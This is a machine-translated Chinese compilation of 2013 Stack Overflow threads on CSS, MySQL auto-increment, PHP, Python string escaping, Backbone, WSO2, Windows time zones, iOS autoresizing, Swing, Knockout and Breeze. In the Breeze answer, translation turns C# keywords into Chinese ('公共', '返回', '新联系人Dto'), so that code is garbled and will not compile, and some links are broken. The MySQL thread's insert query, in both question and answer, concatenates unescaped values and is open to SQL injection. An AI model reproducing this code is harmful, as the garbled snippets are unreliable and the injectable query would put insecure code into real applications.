    background-color: #ccc;
    display: table-cell;
    width: 75%;
}

#right-column
{
    background-color: #eee;
    display: table-cell;
    width: 25%;
} 
```

这是更新的小提琴：http: [//jsfiddle.net/txReR/1/](http://jsfiddle.net/txReR/1/)

请注意，这种方法的一个缺点是浏览器兼容性更多是使用 CSS 表的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:32:26.377

这是一个常见问题，这里有一个专栏解释了如何实现目标

[http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks](http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks)

# mysql - MySQL ID 增量难题

> ID：16091468
> 
> 赞同：0
> 
> 时间：2013-04-18T19:27:33.127
> 
> 标签：mysql, primary-key, auto-increment

我有一个自动递增的 mysql 表。我使用 id 作为主键。

这是键的结构:: id int(255) 否 无 AUTO_INCREMENT

增量是这样发生的：

![出于某种原因，SO 不接受这个数据的问题。 请管理员注意](https://i.stack.imgur.com/P9A9F.png)

如您所见，xxxxxxxxYY 系列，只有 YY 数字递增。

* * *

这是插入语句。

```
$id = $this->get_next_id($this->get_last_id());
$q = 'INSERT INTO '.URL_TABLE.' (id, url, date, title, image, description) 
VALUES ("'.$id.'", "'.$url.'", NOW(), "'.$title.'", "'.$image.'", "'.$description.'")'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:47:57.970

无需提供新 ID。您的列是`AUTO_INCREMENT`，因此它将自动增加（因此得名）。

像这样插入，让数据库处理增量：

```
$q = 'INSERT INTO '.URL_TABLE.' (url, date, title, image, description) 
VALUES ("'.$url.'", NOW(), "'.$title.'", "'.$image.'", "'.$description.'")'; 
```

（完全省略该`id`列）

# css - 使用 CSS 设置某些字符的样式

> ID：16091469
> 
> 赞同：45
> 
> 时间：2013-04-18T19:27:38.793
> 
> 标签：css

我假设这是不可能的，但以防万一或者有人有一个很好的技巧，有没有办法使用 CSS 来定位某些字符？

例如，将`z`段落中的所有字母设为红色，或者在我的特定情况下将`vertical-align:sup`所有`7`in 元素设置为标记为 class `chord`。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-04-18T20:05:03.490

嗨，我知道你在 CSS 中说过，但正如每个人都告诉你的那样，你不能，这是一个 javascript 解决方案，只是我的 2 美分。

最好的...

[JSFiddle](http://jsfiddle.net/9LSrk/)

*css*

```
span.highlight{
   background:#F60;
    padding:5px;
    display:inline-block;
    color:#FFF;
}

p{
   font-family:Verdana;   
} 
```

*html*

```
<p>
    Let's go Zapata let's do it for the revolution, Zapatistas!!!   
</p> 
```

*javascript*

```
jQuery.fn.highlight = function (str, className) {    
    var regex = new RegExp(str, "gi");

    return this.each(function () {
        this.innerHTML = this.innerHTML.replace(regex, function(matched) {return "<span class=\"" + className + "\">" + matched + "</span>";});
    });
};

$("p").highlight("Z","highlight"); 
```

***结果*** ![在此处输入图像描述](https://i.stack.imgur.com/hdaSX.jpg)

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-04-18T19:33:04.360

这在 CSS 中是不可能的。你唯一的选择是[`first-letter`](https://developer.mozilla.org/en-US/docs/CSS/%3a%3afirst-letter)，这不会削减它。使用 JavaScript 或（如您在评论中所述）您的服务器端语言。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-24T10:32:15.437

在 CSS 中做到这一点的唯一方法是将它们包装在一个跨度中并给跨度一个类。然后针对该类的所有跨度。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-15T11:12:25.983

据我了解，它仅适用于常规字符/字母。例如：如果我们想突出显示页面上的所有星号 (\u002A) 符号怎么办。`$("p").highlight("u\(u002A)","highlight");`在js中尝试 并插入`&#42;`到html中，但没有奏效。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-05-19T08:50:09.620

回复@ncubica 但评论太长了，这是一个不使用正则表达式并且不更改除 Text 节点之外的任何 DOM 节点的版本。请原谅我的 CoffeeScript。

```
# DOM Element.nodeType:
NodeType =
  ELEMENT:    1
  ATTRIBUTE:  2
  TEXT:       3
  COMMENT:    8

# Tags all instances of text `target` with <span class=$class>$target</span>
#
jQuery.fn.tag = (target, css_class)->
  @contents().each (index)->
    jthis = $ @
    switch @.nodeType
      when NodeType.ELEMENT
        jthis.tag  target, css_class
      when NodeType.TEXT
        text = jthis.text()
        altered = text.replaceAll  target, "<span class=\"#{css_class}\">$&</span>"
        if altered isnt text
          jthis.replaceWith  altered

($ document).ready ->
  ($ 'div#page').tag '⚀', 'die' 
```

# php - Copy() image url 给我一个不同的结果，因为它在 Firefox > Save as 中打开

> ID：16091473
> 
> 赞同：0
> 
> 时间：2013-04-18T19:27:54.747
> 
> 标签：php, image, copy

我有一个PHP问题。我需要动态保存 PHP 生成的图像。例如这个：

[http://www.colissimo.fr/porttail_colissimo/imageio?styleBold=true&width=75&id=17805280_date_1](http://www.colissimo.fr/portail_colissimo/imageio?styleBold=true&width=75&id=17805280_date_1)

当我在网络浏览器中打开它并执行另存为时，没问题。但是当我通过 php 调用执行此操作时，图像已正确保存，但文本错误（在我的情况下为“????”）：

```
copy('http://www.colissimo.fr/portail_colissimo/imageio?styleBold=true&width=75&id=17805280_date_1', 'my_pic.png'); 
```

您知道如何使图像具有正确的文本吗？

# python - 如何将任何字符串转换为在python中执行时产生该字符串的打印语句

> ID：16091476
> 
> 赞同：0
> 
> 时间：2013-04-18T19:28:05.590
> 
> 标签：python

所以，基本上我要做的是从磁盘中读取一些文本并创建一系列打印语句，执行时将重现读入的文本。

例如在我的文件中包含一行：

> 我说：“这是美好的一天。”

然后我的程序应该生成以下 python 代码作为输出：

```
print "I said, \"It\'s a nice day.\n\"" 
```

请注意，我并不是说它应该执行上面的代码。它应该只生成上述字符串。

我想出了以下代码，它适用于某些情况：

```
import sys
import re

filename = sys.argv[1]

infile = open(filename)

for line in infile:
    line = line.strip()
    line = line.encode('string-escape')
    sys.stdout.write("print \""+line+"\"\n") 
```

这似乎适用于某些行，但不适用于其他行。当我自己运行此代码时，它不适用于双引号。例如，它们没有正确逃脱。任何意见，将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-18T19:30:22.097

用于`repr`获得正确的报价：

```
with open(filename) as r:
    for line in r:
        line = line.strip()
        sys.stdout.write('print %s\n' % repr(line)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:41:56.843

而不是使用`.encode('string-escape')`(因为这似乎只是逃避`\`'s，为什么不使用以下内容：

```
line.replace('"', r'\"') 
```

然后，这将为您逃脱那些`"`s。

您也可能希望对`'`'s 做同样的事情，因为它们也会创建字符串。

# javascript - 用于编辑模型的临时主干集合

> ID：16091477
> 
> 赞同：2
> 
> 时间：2013-04-18T19:28:09.947
> 
> 标签：javascript, backbone.js, backbone-relational

我正在使用一个集合和模型：

```
var StuffCollection = Backbone.Collection;
var StuffModel = Backbone.RelationalModel; 
```

在一个地方，我用模型制作了该集合的一个实例：

```
var stuffCollection = new StuffCollection();
// do stuff here to load a bunch of models 
```

在另一个地方，我想克隆该集合以编辑而不编辑原始集合：

```
var tempStuffCollection = new StuffCollection();
tempStuffCollection.reset(stuffCollection.models);
// do stuff here to edit the collection 
```

但是当我在 tempStuffCollection 中编辑模型时，他们在 stuffCollection 中进行编辑，所以我尝试了这个：

```
var tempStuffCollection = new StuffCollection();
tempStuffCollection.reset(stuffCollection.toJSON());
// do stuff here to edit the collection 
```

所以看起来所有的引用都被删除了......但没有！当我在 tempStuffCollection 中编辑模型时，它仍然会在 stuffCollection 中更改它们！

如何分离两个模型集合？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:32:54.777

您将需要克隆该集合。这是一种方法。

```
var tempStuffCollection = new StuffCollection();
stuffCollection.each(function(model) {
  tempStuffCollection.add(new Backbone.Model(model.toJSON()));
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:35:11.867

它可能对您不起作用的原因是 Backbone Relational 发现您放入临时集合中的模型与原始集合中的模型相同，因此它使用旧模型代替。它通过查看每个模型的 idAttribute 来做到这一点。

因此，您可以尝试在将模型放入临时集合时更改模型的 idAttribute 的名称，然后在完成后将它们改回。

也许像这样将它们放入您的临时集合中：

```
var parsedStuffCollection = stuffCollection.toJSON()

_.each(parsedStuffCollection, function(stuffAttributes){
    stuffAttributes.tempIDAttribute = stuffAttributes.myIdAttribute;
    delete stuffAttributes.myIdAttribute;
})

var tempStuffCollection = new StuffCollection({parsedStuffCollection}); 
```

然后，只需执行相反的操作即可将它们改回来

编辑：刚刚意识到这与 Loamhoof 的回答完全相同

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T23:00:10.857

你的问题似乎是你不能有两次相同的模型。因此，您可以执行以下操作：

```
var tempStuffCollection = new StuffCollection();
stuffCollection.each(function(model) {
  var json = model.toJSON();
  json._id = json.id; // _id is maybe a reserved attribute, change it if needed
  delete json.id;
  tempStuffCollection.add(new Backbone.Model(json));
}); 
```

然后进行逆运算...

# wso2 - 我无法在应用程序中获取服务列表，即；wso2 治理注册表？我正在使用二进制代码

> ID：16091482
> 
> 赞同：0
> 
> 时间：2013-04-18T19:28:14.727
> 
> 标签：wso2, wso2carbon

我正在尝试获取资源路径 /_system/governance/trunk/services 中的服务列表。所以最初我试图使用注册表 api 获取资源。我尝试了两种方式。一种方法是

```
 `CarbonContext cCtx = CarbonContext.getCurrentContext();

          Registry registry = cCtx.getRegistry(RegistryType.SYSTEM_CONFIGURATION);
          String registryType = request.getParameter("registryType");
          if(registryType != null) {
          registry = cCtx.getRegistry(RegistryType.valueOf(registryType));
          }
          String resourcePath = "/_system/governance/trunk/services";
          try{
      if(registry.resourceExits(resourcePath)){
        Resource resource = registry.get(resourcePath);
      }
      }catch(Exception e){
       out.print(e.getMessage());
      }` 
```

使用 ServiceManager 的另一种方法，我在初始化 ServiceManager 的第一步失败

```
 'CarbonContext cCtx = CarbonContext.getCurrentContext();

             Registry registry = cCtx.getRegistry(RegistryType.SYSTEM_CONFIGURATION);
             String registryType = request.getParameter("registryType");
             if(registryType != null) {
                   registry = cCtx.getRegistry(RegistryType.valueOf(registryType));
               out.print(" Registry got Initialised ! ");
             }
        java.util.List<Resource> result = new java.util.ArrayList<Resource>();
        String resourcePath = "/_system/governance/trunk/services";
        ServiceManager serviceManager = new ServiceManager(registry);' 
```

那么我需要做什么来获取 index.jsp 中所有服务的列表并且我正在使用二进制代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-07T15:53:17.167

就我而言，我在 Identity Server 4.1.0 中工作。我在以下路径中的管理控制台（Web 前端）中添加了一个资源在注册表中：/_system/local/repository 该资源称为 apacheInfo。在资源中，我添加了一个带有
key = com.xxx.identity.Apache
value = www.domain.com:8998
我的代码的属性：

```
CarbonContext cCtx = CarbonContext.getCurrentContext();
//this implies the path /_system/local/
Registry registry = cCtx.getRegistry(RegistryType.LOCAL_REPOSITORY);
Resource resource;
String apacheUrl;
            try {
                resource = registry.get("repository/apacheInfo");
                apacheUrl = resource.getProperty("com.xxx.identity.Apache");
            } catch (RegistryException e) {
                LOG.error("RegistryException looking up path repository/apacheInfo", e);
            } 
```

我从未在 WSO2 文档中找到示例，但我看到了这段对话：
[http://wso2-oxygen-tank.10903.n7.nabble.com/Generic-Resource-Registry-Management-in-App-Factory-td79279。 html](http://wso2-oxygen-tank.10903.n7.nabble.com/Generic-Resource-Registry-Management-in-App-Factory-td79279.html)
然后我了解了他们阅读存储库的方式...希望这会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-24T17:08:14.513

您应该使用治理注册表来初始化 ServiceManager。

ServiceManager serviceManager = new ServiceManager(governanceRegistry);

服务[] 服务 = serviceManager.getAllServices();

[1] [http://docs.wso2.org/wiki/display/Governance453/Services+with+Governance+API](http://docs.wso2.org/wiki/display/Governance453/Services+with+Governance+API)

-阿吉特

# windows - Windows GetTimeZoneInformation 时差与 ISO 网站或 Google 不匹配

> ID：16091483
> 
> 赞同：0
> 
> 时间：2013-04-18T19:28:18.577
> 
> 标签：windows, timezone, timezone-offset

我的电脑是 Windows 7 64 位；我在美国东海岸（东部时间）；“日期和时间”小程序——右键单击任务栏时钟并选择“调整日期/时间”——将我的时区标记为“（UTC-05:00）东部时间（美国和加拿大）”并告诉我说夏令时在 11 月结束。（对于那些后来出现的人，这是在四月写的，在我们进行“春天前进”以到达夏令时之后。）

调用 Windows GetTimeZoneInformation 或 GetDynamicTimeZoneInformation API（后者仅在 Vista 或更高版本上可用）返回 300 分钟 5 小时的“偏差”值。（偏差值不是负数，因为该值的文档说“UTC = 本地时间 + 偏差”。）

但是，如果我访问[声称向我显示计算机时间的 ISO 网站，](http://wwp.greenwichmeantime.com/info/iso.htm)它会显示与时钟匹配但以 -0400 结尾的时间。（我试图复制/粘贴它，但很难，因为它每秒都在变化。）在谷歌中输入“当前时间 utc”显示的时间也比时钟时间提前 4 小时（不是 5 小时）。

更让我感到困惑的是——我有一个运行 Windows Server 2008 的 EC2 实例，其他人设置并说它故意设置为 GMT，这样基于服务器时钟记录的时间不会因夏令时导致 1 小时跳跃.

当我连接到该服务器时，它显示的时间比我在这里看到的时间早 5 小时。但是它在控制面板中的日期/时间小程序（不同于 Windows 7）显示当前时区是“（格林威治标准时间）格林威治标准时间（都柏林、爱丁堡、里斯本、伦敦）”但也有一个时区“（格林威治标准时间）协调世界时” - UTC - 如果我将时区更改为那个（我认为是正确的），则偏移量为 4 小时。

Windows 7 上的“时区设置”对话框（通过单击上面讨论的“日期和时间”小程序上的“更改时区...”按钮进入）具有标记为“(UTC) 协调世界时”的时区（4 小时从现在起）和“（UTC）都柏林、爱丁堡、里斯本、伦敦”（从现在起 5 小时）。

除了认为 EC2 实例的时区设置错误——它应该被设置为 UTC 而不是伦敦时间来实现上述目标——我没有进一步理解这一点。美国的 Windows 7 说我距离 UTC 5 小时；其他一切（包括设置为 UTC 时间的 Windows 2008）都说 4 小时。

那么例程应该怎么做才能产生一个带有尾随时区偏移量的 ISO 风格的时间戳呢？Windows API 告诉我它应该是-0500，但其他一切都说它应该是-0400。帮助！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T00:19:23.327

在东部夏令时间期间，偏移量确实是 UTC-04:00。Windows 中时区的显示名称列表不会更改以反映这一点。它仅显示标准偏移量，东部标准时间为 UTC-05:00。

您是正确的，服务器应设置为“（UTC）协调世界时”，而不是标记为“（UTC）都柏林，爱丁堡，里斯本，伦敦”的设置。“协调世界时”设置永久固定为 UTC，而另一个在英国夏令时的日光偏移为 UTC+01:00。同样，标签仅显示标准偏移量，即 UTC+00:00，在显示中缩短为“(UTC)”。

您问的唯一编程问题：

> 那么例程应该怎么做才能产生一个带有尾随时区偏移量的 ISO 风格的时间戳呢？

这在很大程度上取决于您使用的语言。您提到了用于获取系统当前时区信息的 Win32 API，但很少有人会直接调用这些 API。你是用C写的吗？C++？C＃？VB? 爪哇？还有什么？请回答，我可以回答这个问题。

# iphone - UIView 调整子视图的大小

> ID：16091484
> 
> 赞同：0
> 
> 时间：2013-04-18T19:28:18.840
> 
> 标签：iphone, ios, uiview

我遇到了奇怪的调整大小行为。

当我调整 UIView 的大小时，它的子视图的高度变为 0。

我想下面的代码只会调整视图的大小 - 而不是它的子视图。

```
NSLog(@"view = %@", view);    
NSLog(@"subview = %@", subview);
CGRect frame = view.frame;
frame.size.height = 50;
view.frame = frame;
NSLog(@"view = %@", view);
NSLog(@"subview = %@", subview); 
```

但是，以上产生以下输出：

```
view = <UIView: 0x97e68c0; frame = (0 0; 320 400); autoresize = RM+BM; layer = <CALayer: 0x97e5f10>>
subview = <UIView: 0xb87f510; frame = (0 0; 320 50); autoresize = W+H; layer = <CALayer: 0xb87f020>>
view = <UIView: 0x97e68c0; frame = (0 0; 320 50); autoresize = RM+BM; layer = <CALayer: 0x97e5f10>>
subview = <UIView: 0xb87f510; frame = (0 0; 320 0); autoresize = W+H; layer = <CALayer: 0xb87f020>> 
```

有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:35:48.097

关键是日志输出中的这一部分：

```
autoresize = W+H; 
```

这是 .log 的日志描述`UIView` `-autoresizingMask`。[在此处](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIView_Class/UIView/UIView.html#//apple_ref/occ/instp/UIView/autoresizingMask)查看文档。基本上，这是您描述在调整超级视图大小时子视图应该做什么的方式。它非常强大。

您当前的规则告诉子视图在调整超级视图大小时调整宽度和高度，并保持子视图上方和下方的距离静态（根据超级视图坐标系）。因为子视图不是很高，并且您正在调整超级视图的大小很多，所以子视图下降到零高度以尝试保持上方和下方的距离。

# javascript - 单击后退按钮时页面过期

> ID：16091488
> 
> 赞同：2
> 
> 时间：2013-04-18T19:28:35.263
> 
> 标签：javascript, jquery

我有一个搜索航班的页面。如果用户在浏览器中单击了后退按钮，它应该会显示一条错误消息。我尝试了以下代码： -

```
 function preventBack(){window.history.forward();}

    setTimeout("preventBack()", 0);

    window.onunload=function(){null}; 
```

问题是它没有重定向到显示“此文档已过期”的页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:36:01.860

你可以试试这个：

```
$(window).on('beforeunload', function () {
    // Prevent back
    alert('This document has been expired.');
    window.history.forward();
}); 
```

**此外，我们还有另一种选择：**

```
$(window).unload(function () {
     // Prevent back
     alert('This document has been expired.');
     window.history.forward();
}); 
```

更新：

```
<script type="text/javascript">
    window.history.forward();
    function noBack() { window.history.forward(); }
</script>
</head>
<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload=""> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T20:33:53.583

您无法检测到用户是否本机单击了“返回”按钮。你得到的理由

> 此文件已过期

是您在前一页上一次又一次地发送新表格。这是您架构中的一个很大缺陷。

但是，如果您仍然坚持这种方法，**则可以**使用[此插件](http://www.bajb.net/2010/02/browser-back-button-detection/)。*当检测到后退点击*时，只需重定向到错误页面。（喜欢`window.location = '/path/to/error/page.html'`）

# java - ActionListener 非正统无限帧 Java

> ID：16091489
> 
> 赞同：0
> 
> 时间：2013-04-18T19:28:36.267
> 
> 标签：java, swing, jframe, jbutton, actionlistener

所以当我点击按钮时，我试图让我的 ActionListener 工作。但是，每当我创建一个框架时（错误似乎发生在 createComponents() 方法中，我不明白为什么）JVM 会不断生成 MyCustomFrame 对象的无限实例。

```
import java.awt.*;
import javax.swing.*;
import java.awt.event.*;

public class MyCustomFrame extends JFrame
{
private JButton button;
private JLabel label;
private static final int FRAME_WIDTH = 800;
private static final int FRAME_HEIGHT = 800;

public static void main(String[] args)
{
    MyCustomFrame frame = new MyCustomFrame();
    frame.setTitle("My first frame");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setVisible(true);
}

public MyCustomFrame()
{
    setTitle("My Custom Frame");
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    setSize(FRAME_WIDTH,FRAME_HEIGHT);
    setVisible(true);
    createComponents();
}

private void createComponents()
{
    button = new JButton("Click me!");
    ClickListener listener = new ClickListener();
    button.addActionListener(listener);
    label = new JLabel("Hello, World!");
    JPanel panel = new JPanel();
    panel.add(button);
    panel.add(label);
    add(panel);
}

class ClickListener extends MyCustomFrame implements ActionListener
{
    public void actionPerformed(ActionEvent e)
    {
        label.setText("Button was clicked.");
    }

}

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:20:50.367

```
class ClickListener extends MyCustomFrame implements ActionListener 
```

MouseListener 没有理由扩展 Frame。每次创建侦听器时显示您创建另一个框架，这会创建另一个侦听器，依此类推。

代码应该只是：

```
class ClickListener implements ActionListener 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:44:30.687

我认为你应该这样做

```
button.addActionListener(this) 
```

然后在同一个类中创建一个方法是这样的

```
public void actionPerformed(ActionEvent e) {
    label.setText("Button was clicked.");
} 
```

至少这对我有用

# jquery - 从具有固定第一列的淘汰视图模型创建动态表

> ID：16091493
> 
> 赞同：2
> 
> 时间：2013-04-18T19:28:50.330
> 
> 标签：jquery, knockout.js

我想根据月中的天数创建动态表并对其应用淘汰赛绑定。到目前为止，我已经创建了基本表并生成了*tds*。

这是我的 KO 视图模型：

```
 var WorkerModel = function (_workerId, _workerFullName, _daysOfTask) {
     this.workerId = _workerId;
     this.workerFullName = _workerFullName;
     this.daysOfTask = _daysOfTask;
 };

 var AppViewModel = {

     daysInMonth: ko.observable(),
     workersArray: ko.observableArray(),

     getWorkers: function () {
       // get workers from server
     }
 } 
```

我创建了 jsfiddle 示例： [jsfiddle](http://jsfiddle.net/freshbm/Hy3mz/)

问题是，我不知道如何确定 dayOfMonth 是否为 dayOfTask 并将 html 添加到该 .

> foreach: daysInMonth - 创建 td
> 
> if (daysOfTask[i] == dayOfMonth) 将 html: "W" 放入 td

另外，我如何使用*ko.observable()*进行迭代？在小提琴中，我将 daysInMonth 作为*observableArray()*但不知道如何`for loop`通过淘汰赛创建。像这样的东西：

> daysInMonth = ko.observable(15);
> 
> < ko for (i=0; i < daysInMont; i++) >
> 
> ...一些代码
> 
> </ko>

基本上我想得到这个表格布局：

![在此处输入图像描述](https://i.stack.imgur.com/jFvX7.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:42:48.820

你在正确的轨道上。

您可以使用`if`绑定有条件地显示“W”。您只需要使用该[`indexOf`方法](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)（或者如果您的浏览器不支持它，则使用 jQuery、underscore.js 等中存在的实现）来检查`daysInMonth`集合中的当前项目是否在`daysOfTask`数组中。

您可以从`daysInMonth`具有属性的当前项目和具有[上下文绑定属性](http://knockoutjs.com/documentation/binding-context.html)`$data`的实际 `daysOfTask`数组中获取：`$parent`

```
<!-- ko foreach: $root.daysInMonth-->
    <td>
        <!-- ko if: $parent.daysOfTask.indexOf($data) != -1 -->
            W
        <!-- /ko -->
    </td>
<!-- /ko --> 
```

演示[JSFiddle。](http://jsfiddle.net/SBtdv/)

# entity-framework - 在 Web API 中使用实体的部分和投影

> ID：16091496
> 
> 赞同：4
> 
> 时间：2013-04-18T19:29:04.207
> 
> 标签：entity-framework, breeze

我正在使用带有 Web API 的微风。我对如何“过滤列”或如何不将整个表公开给我的 Web API 没有很好的掌握。我使用实体框架作为我的来源，John Papa 在这里解决了我的两个问题：http: [//www.johnpapa.net/spajs04/#comment-113761](http://www.johnpapa.net/spajs04/#comment-113761) 并被 Ward Bell 确认是一个很好的解决方案。有人可以告诉我如何使用实体框架来创建可在我的 webapi 中查询并且可以与微风一起使用的部分或投影吗？

这是我在 webapi 中的当前功能

```
[HttpGet]
public IQueryable<Contact> GetContacts()
{
    return _contextProvider.Context.Contact;
} 
```

这是我目前的课程：

```
public class Contact
{
    [Key]
    public Guid ID { get; set; }

    public string FirstName { get; set; }
    public string LastName { get; set; }
    public string NickName { get; set; }
    public string JobTitle { get; set; }
    public DateTime BirthDate { get; set; }
    public bool Gender { get; set; }
    public string SSN { get; set; }
    public DateTime DateCreated { get; set; }
    public DateTime DateUpdated { get; set; }

    public virtual ICollection<Address> Address { get; set; }
} 
```

我想要一个可查询的 webapi 函数，它是我当前的类，**没有**SSN 字段。一个“数据库优先”实体且不涉及更改我的数据库或添加“视图”的解决方案会很棒。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-21T23:03:13.357

当您尝试减少有效负载时，客户端投影很好。当您必须确保某些数据（例如，SSN）对客户端真正安全地隐藏时，您需要一些服务器端的东西。

@james 建议 - 使用`[NonSerialized]`（或[JSON.NET](http://james.newtonking.com/archive/2009/10/23/efficient-json-with-json-net-reducing-serialized-json-size.aspx)的`[JsonIgnore]`属性） - 当 SSN**永远**不应该发送给客户端时，这是一种简单而有效的方法。

如果在授权情况下 SSN 应该在客户上可见（例如，查看她自己的 SSN 的用户或有权查看 SSN 的 HR 人员），这太不灵活了。JSON.NET [*IContractResolver*](http://james.newtonking.com/projects/json/help/index.html?topic=html/T_Newtonsoft_Json_Serialization_IContractResolver.htm)为您提供了极大的灵活性，可以根据授权规则动态决定哪些属性可以跨越服务边界。

有些人可能会认为用序列化程序解决这个问题太过分了。他们可能会对您展示的服务器端投影感到满意，@chris_dotnet。顺便说一句，从投影返回一个仍然有意义，`IQueryable`以便客户端可以通过过滤查询减少网络负载。

其他人会更喜欢定义一个 DTO ( `ContactDTO`) 并通过网络对其进行序列化。

```
[HttpGet]
    公共 IQueryable GetContacts()
    {
      返回 _contextProvider.Context.Contacts
        .选择（p =>
            新联系人Dto
            {
                名字 = p.名字，
                ID = p.ID，
                姓氏 = p.姓氏
            });
    }

```

这`IQueryable`比投影版本更健壮，因为过滤可以在数据层而不是服务器层上进行。

在客户端，您可以为`ContactDto`类型定义元数据，也可以使用 a`JsonResultsAdapter`将`ContactDto`数据映射到`Contact`Breeze 实体中。

使用`JsonResultsAdapter`前提是您实际上希望`Contact`类型（在服务器上的业务模型中形成的类型）在客户端上是已知的。

`Contact`您可能不希望从您的服务中公开服务器端形状。许多人对此感到非常强烈。如果您是这些人中的一员，最好定义一个“DTO 模型”来表示您希望在客户端上看到的实体。这意味着学习为您的 DTO 模型创建元数据并在服务器上编写映射逻辑以在 DTO 和您的业务模型之间移动。

您可以看到所有这些如何成为一个大话题。这是我将很快在 Breeze 文档中讨论的内容。将这个答案视为即将发生的事情的味道。要点是……您有很好的选择来隐藏用户不应该看到的数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T12:32:18.330

感谢 John 提供此信息，我查看了该信息，这对客户端过滤很有帮助。我发现我可以从客户端和/或服务器端做到这一点。

微风客户端：

```
var query = EntityQuery.from("Customers")
.select("ID, FirstName, LastName"); 
```

服务器端：

```
 [HttpGet]
    public IQueryable<Contact> GetContacts()
    {
        var contactList = _contextProvider.Context.Contacts
        .ToList()
        .Select(p =>
            new Contact
            {
                FirstName = p.FirstName,
                ID = p.ID,
                LastName = p.LastName
            })
        .AsQueryable(); // actually IQueryable is not useful after "ToList()"

        return contactList ;
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T20:25:57.107

Chris - 在课程中有一个关于演讲者和会话部分的例子。我从那些我不返回描述字段（用于会话）或生物字段（用于演讲者）的人返回预测。检查并使用相同的样式不为您的 Employee 类显示您的 SSN 字段

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-18T20:40:10.147

你不能将你的属性标记为 [NonSerialized]

```
[NonSerialized] 
 public string SSN { get; set; } 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-10-20T01:14:09.730

我刚刚找到了另一种根据条件忽略列的解决方案。只需添加一个属于感兴趣模型的部分类（生成我的模型）并使用`ShouldSerialize%PropertyName%`：

```
namespace ProvSys.Models
{
    partial class tblEmployees
    {
        public static bool ShouldSerializeResetPassword()
        {
            // Only hand over ResetPassword Field for admin role
            return (ProvSysRepository.IsAdmin);
        }
    }
} 
```

在此示例中，仅当用户处于管理员角色时才会传输表的`ResetPassword`属性。`tblEmployees`

# jsf - 如何将对象字符串字段设置为 jsf 列表框

> ID：16091497
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:29:08.637
> 
> 标签：jsf

在 JSF 支持 bean 中，我将值定义为，

```
private List<Cite> cites = new ArrayList<Cite>(); 
```

并且`Cite`有一个类似的字符串

```
Cite {
    private String value;
} 
```

JSF 代码

```
 <h:panelGroup>                 
    <h:outputText value="Cite"/>
    <h:inputText id="citeTxt" style="width:75px" value="#{manualDataEntryRegText.cite}">
       <f:ajax execute="@this" render="citeTxt" />
    </h:inputText>
    </h:panelGroup>

<h:panelGroup>  
    <h:commandButton value="Add" action="#{manualDataEntryRegText.editCite}">
        <f:ajax execute="@this" render="dtCites" />
    </h:commandButton>
</h:panelGroup>

<h:panelGroup>
    <h:selectManyListbox style="width:75px" id="dtCites" value="#{manualDataEntryRegText.cites}" var="cite" size="3">
        <c:selectItems id="citeSelectItems" value="#{cite.value}" />
        <c:ajax event="change" />
    </h:selectManyListbox>
</h:panelGroup> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:25:21.330

修改您的列表如下：

```
<h:selectManyListbox style="width:75px" id="dtCites" value="#{manualDataEntryRegText.cites}" size="3" converter="citeConverter" ...>
    <f:selectItems value="#{citeBean.allCites}" var="cite"
itemLabel="#{cite.value}" itemValue="#{cite}" />
</h:selectManyListbox> 
```

并且不要忘记创建和添加一个`@FacesConverter`for`Cite`类（基本示例可以在[Mkyong 的教程](http://www.mkyong.com/jsf2/custom-converter-in-jsf-2-0/)中找到）*或*将所有值（`value`列表框和`itemValue`选择项）绑定为纯字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:24:45.160

列表应该是一个`SelectItem`列表：

```
List<SelectItem> list = new ArrayList<SelectItem>();

SelectItem s  = new SelectItem(cite.value, "lable");
lilst.add(s)

 <f:selectItems id="citeSelectItems" value="#{bean.list}" /> 
```

# javascript - 锚标记 Mailto 破坏/禁用点击事件，target="_blank" 行为次优

> ID：16091499
> 
> 赞同：0
> 
> 时间：2013-04-18T19:29:13.927
> 
> 标签：javascript, jquery, backbone.js, anchor, mailto

在使用 Outlook 时单击带有 mailto: href 的锚标记时，我遇到了一个奇怪的问题，进一步单击页面上没有发生的事件。不单击链接将允许进一​​步的单击事件正常工作。

我无法让它在本地发生很长时间，所以直觉我将锚标签上的目标更改为`target="_blank"`在新窗口中打开。这似乎已经解决了这个问题，但是现在启动电子邮件客户端的打开窗口在客户端加载后保持打开状态。

